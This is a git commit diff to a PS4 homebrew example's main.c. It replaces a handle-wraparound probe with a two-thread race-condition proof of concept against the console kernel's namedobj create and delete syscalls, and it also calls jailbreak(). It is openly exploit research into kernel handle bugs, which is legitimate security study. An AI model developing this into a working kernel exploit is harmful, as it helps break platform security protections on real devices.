ca3d73ca05baf4db8127a179e126a37e7ebb2dcf
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2026-06-13 23:03:57 +0100

    Update main.c

--- examples/ps4-disable-updates/source/main.c
+++ examples/ps4-disable-updates/source/main.c
@@ -1,7 +1,48 @@
+#include "ps4.h"
+
+#define SYS_NAMEDOBJ_CREATE 557
 #define SYS_NAMEDOBJ_DELETE 558
 
-#include "ps4.h"
-#include "syscall.h"
+static int namedobj_create(const char* name, 
+                            int fd, 
+                            uint32_t flags) {
+    return syscall(SYS_NAMEDOBJ_CREATE, name, fd, flags);
+}
+
+static int namedobj_delete(uint32_t handle, 
+                            uint16_t flags) {
+    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
+}
+
+static volatile int g_handle  = -1;
+static volatile int g_running =  1;
+
+void* thread_delete(void* arg) {
+    while (g_running) {
+        if (g_handle != -1) {
+            int h    = g_handle;
+            g_handle = -1;
+            namedobj_delete(h, 0x107);
+        }
+    }
+    return NULL;
+}
+
+void* thread_create(void* arg) {
+    while (g_running) {
+        SceKernelEqueue eq;
+        sceKernelCreateEqueue(&eq, "poc");
+        int fd = (int)eq;
+
+        if (fd < 0) continue;
+
+        int h = namedobj_create("poc", fd, 0x107);
+        if (h != -1) {
+            g_handle = h;
+        }
+    }
+    return NULL;
+}
 
 int _main(struct thread *td)
 {
@@ -13,41 +54,18 @@ int _main(struct thread *td)
     jailbreak();
     initSysUtil();
 
-    SceKernelEqueue eq;
-    SceKernelEqueue handles[8];
+    ScePthread tA, tB;
 
-    printf_notification("Generation Wraparound ");
+    printf_("=== namedobj race PoC ===\n");
 
-    sceKernelCreateEqueue(&eq, "poc");
+    scePthreadCreate(&tA, NULL, thread_delete, NULL, "del");
+    scePthreadCreate(&tB, NULL, thread_create, NULL, "cre");
 
-    uint64_t h0 = eq;
+    sceKernelSleep(10);
+    g_running = 0;
 
-    printf_debug("Initial: 0x%lx\n", h0);
-
-    for(int i = 0; i < 8; i++)
-    {
-        syscall(
-            SYS_NAMEDOBJ_DELETE,
-            (uint32_t)(h0 >> 32),
-            0x107
-        );
-
-        sceKernelCreateEqueue(
-            &handles[i],
-            "poc"
-        );
-
-        printf_debug(
-            "Iteration %d: 0x%lx\n",
-            i,
-            handles[i]
-        );
-    }
-
-    if ((handles[7] & 0xffff) == (h0 & 0xffff))
-    {
-        printf_notification("WRAP CONFIRMED");
-    }
+    scePthreadJoin(tA, NULL);
+    scePthreadJoin(tB, NULL);
 
     return 0;
 }
